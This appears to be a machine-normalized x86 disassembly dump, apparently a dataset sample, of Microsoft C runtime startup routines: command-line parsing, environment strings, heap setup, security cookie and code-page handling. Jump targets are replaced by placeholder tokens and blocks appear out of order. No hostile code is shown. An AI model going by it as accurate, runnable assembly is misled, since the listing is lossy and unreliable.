cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_41a4ff
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_41a4ff
pop ecx
test eax eax
je r-xdata
call sub_41a4ff
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_41144c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rwxdata ] ebx
jne r-xdata
push 0x104
mov esi rwxdata
push esi
push ebx
mov [ rwxdata ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rwxdata ]
mov [ rwxdata ] esi
cmp eax ebx
je r-xdata
call sub_412124
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_4112b2
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_413447
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_4112b2
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rwxdata ] eax
mov [ rwxdata ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_411507
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
sub esp 0xc
push ebx
push esi
mov esi [ GetEnvironmentStringsW@IAT ]
push edi
xor ebx ebx
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call esi
mov edi eax
cmp edi ebx
je r-xdata
cmp eax 0x2
je r-xdata
cmp edi ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rwxdata ] 0x1
jmp r-xdata
call [ GetEnvironmentStrings@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax edi
cmp [ edi ] bx
je r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rwxdata ]
push 0x2
pop eax
mov [ rwxdata ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi ] bl
je r-xdata
mov esi [ WideCharToMultiByte@IAT ]
push ebx
push ebx
push ebx
sub eax edi
push ebx
sar eax 0x1
inc eax
push eax
push edi
push ebx
push ebx
mov [ ebp - 0xc ] eax
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax esi
inc eax
push eax
mov [ ebp - 0x8 ] eax
call sub_413447
mov edi eax
pop ecx
cmp edi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push eax
call sub_413447
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push [ ebp - 0x8 ]
push esi
push edi
call sub_40f720
add esp 0xc
push esi
call [ FreeEnvironmentStringsA@IAT ]
mov eax edi
push esi
call [ FreeEnvironmentStringsA@IAT ]
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push ebx
push ebx
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push edi
push ebx
push ebx
call esi
test eax eax
jne r-xdata
mov ebx [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_40fe78
pop ecx
mov [ ebp - 0x4 ] ebx
sub_41163e
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_411664
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_41168e
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rwxdata ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rwxdata ] eax
pop ebp
retn
pop ebp
retn
sub_4116be
cmp [ rwxdata ] 0x3
jne r-xdata
push [ rwxdata ]
call [ HeapDestroy@IAT ]
and [ rwxdata ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rwxdata ]
push 0x0
push [ rwxdata ]
call edi
pop edi
pop ebx
push esi
mov esi [ rwxdata ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rwxdata ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rwxdata ]
jl r-xdata
pop esi
sub_411738
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rwxdata ] eax
jmp r-xdata
mov [ rwxdata ] esi
not esi
mov [ rwxdata ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_4117d6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_4174f2
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_40d7cc
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_40d7f2
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_41185b
push 0x14
push r--data
call sub_40e30c
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] edi
call sub_40d7cc
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
call sub_40e351
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40d7df
mov [ eax ] edi
call sub_40d7cc
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_40d749
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4117d6
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41196a
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_411974
mov edi edi
push ebp
mov ebp esp
inc [ rwxdata ]
push 0x1000
call sub_413447
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_4119bd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_40d7cc
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_40d749
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_411a21
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_411a50
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_413d20
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rwxdata
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_411ab4
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_41aba8
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_41a9a9
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_41a9a9
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_413d20
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_411c47
push 0xc
push r--data
call sub_40e30c
call sub_40e99d
mov edi eax
mov eax [ rwxdata ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rwxdata ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411ce2
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rwxdata ]
mov [ edi + 0x68 ] eax
mov esi [ rwxdata ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_40e351
retn
push 0x20
call sub_410a02
pop ecx
cmp esi rwxdata
je r-xdata
push esi
call sub_40fe78
pop ecx
sub_411ceb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov [ rwxdata ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rwxdata ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rwxdata ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rwxdata ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_411d67
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_411ceb
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_411a50
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_413d20
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rwxdata ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rwxdata ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_411a21
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rwxdata ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_411ab4
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rwxdata ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rwxdata ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_413d20
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_411a21
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_411f4c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x4 ]
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_411f8a
push 0x14
push r--data
call sub_40e30c
or [ ebp - 0x20 ] 0xffffffff
call sub_40e99d
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_411c47
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_411ceb
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_413447
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_40e351
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_411d67
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rwxdata
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rwxdata
je r-xdata
call sub_40d7cc
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40fe78
pop ecx
test [ rwxdata ] 0x1
jne r-xdata
push eax
call sub_40fe78
pop ecx
push 0xd
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rwxdata ] eax
mov eax [ ebx + 0x8 ]
mov [ rwxdata ] eax
mov eax [ ebx + 0xc ]
mov [ rwxdata ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rwxdata ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rwxdata ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rwxdata ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rwxdata ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rwxdata ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4120eb
jmp r-xdata
mov eax [ rwxdata ]
cmp eax rwxdata
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_40fe78
pop ecx
sub_41214e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rwxdata
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rwxdata
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_40fe78
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_40fe78
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_40fe78
push [ esi + 0xc0 ]
call sub_40fe78
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_41b034
push [ edi ]
call sub_40fe78
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rwxdata
je r-xdata
push esi
call sub_40fe78
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40fe78
pop ecx
push [ esi + 0xb0 ]
call sub_40fe78
push [ esi + 0xbc ]
call sub_40fe78
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40fe78
push [ esi + 0xbc ]
call sub_41b4b7
pop ecx
pop ecx
push eax
call sub_40fe78
pop ecx
push eax
call sub_40fe78
push [ esi + 0xbc ]
call sub_41b275
pop ecx
pop ecx
sub_412297
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rwxdata
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_412326
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rwxdata
je r-xdata
